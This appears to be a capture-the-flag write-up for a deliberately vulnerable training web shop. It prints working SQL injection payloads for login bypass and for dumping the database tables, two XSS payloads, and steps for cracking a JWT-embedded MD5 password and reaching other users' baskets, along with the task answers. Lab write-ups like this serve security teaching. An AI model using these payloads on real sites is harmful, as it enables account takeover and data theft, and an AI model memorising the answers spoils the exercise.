```


###[Task 1] Connect To Our Network
1. Connect to our Network
```
No answer needed
```

###[Task 2] Configure Burp(If you haven't already)
1. Set up Burp
```
No answer needed
```

###[Task 3] Walk through the application
1. Walk through the application and use the functionality available
```
No answer needed
```

###[Task 4] Injection
1. Log in with the administrator's user account using SQL Injection
```
No aswer needed
```

To log in to the administrator account we just need trick the query send through the backend to the database system

What the standard the query supposed to look like...
```
SELECT * FROM <users> WHERE email='$email' AND password='md5($password)'
```
With this knowledge we can manipulate the $email variable by closing the string and appending what we want to bypass that, and just commnent the other stuff that we don't want

Query:
```
'OR 1=1 -- -
```

###[Task 5] Broken Authentication
1. reset Jim's password using the forgotten password mechanism - what was the answer to the secret question?
```
samuel
```

First way:
SQLi from search
Query progress
```
/rest/product/search?q='

')) UNION SELECT 1,2,3,4,5,6,7,8 -- -

lalala')) UNION SELECT name,tbl_name,3,4,5,6,7,8 FROM SQLITE_MASTER WHERE type="table"/*

lalala'))+UNION+SELECT+sql,tbl_name,3,4,5,6,7,8+FROM+SQLITE_MASTER+WHERE+tbl_name%3d"SecurityAnswers"/*

lalala')) UNION SELECT id,UserId,answer,4,5,6,7,8 FROM SecurityAnswers/*

47bd24c3702cf53594f1e14320f798512b3cbb492fdae4305fe30607f81588cf
```


Second way:
look at main.js, see that there is a  path to administration, then look at the recycling order from user 2 (jim). there's said it's from starfleet, star trek reference just search for the eldest sibling...

2. What is the administrator password?
```
admin123
```

When we logged in as the administrator we can see from the request on burpsuite that there is somesort of base64 token, but not all the string can be decoded by base64, looking at the starting string after decoding it we can see that it is a JWT token. And there's a lot of information from that token... and there is a hashed password there... MD5 hashed password to be exact. then... just dehash that using john, or hashcat, or any other tools you want

###[Task 6] Sensitive Data Exposure
1. Access a confidential document and enter the name of the first file with the extension ".md"
```
acquisitions.md
```

There is a robots.txt file and there we can see that there is /ftp directory...

###[Task 7] Broken Access Control
1. Access the administration section of the store - What is the name of the page?
```
administration
```

Look at main.js, there is a path through administrator

2. Access someone else's basket
```
No answer needed
```

Check your browser storage, there is an id equavalent to UserId there

3. Get rid of all 5 star customer feedback
```
No answer needed
```

Just delete it from administration page

###[Task 8] Cross Site Scripting(XSS)
1. Carry out reflected XSS using Tracking Orders
```
No answer needed
```

Injection
```
<iframe src="javascript:alert(`xss`)">
```

2. Carry out XSS using the Search field?
```
No answer needed
```

Injection
```
<img src=x onerror=alert('XSS');>
```
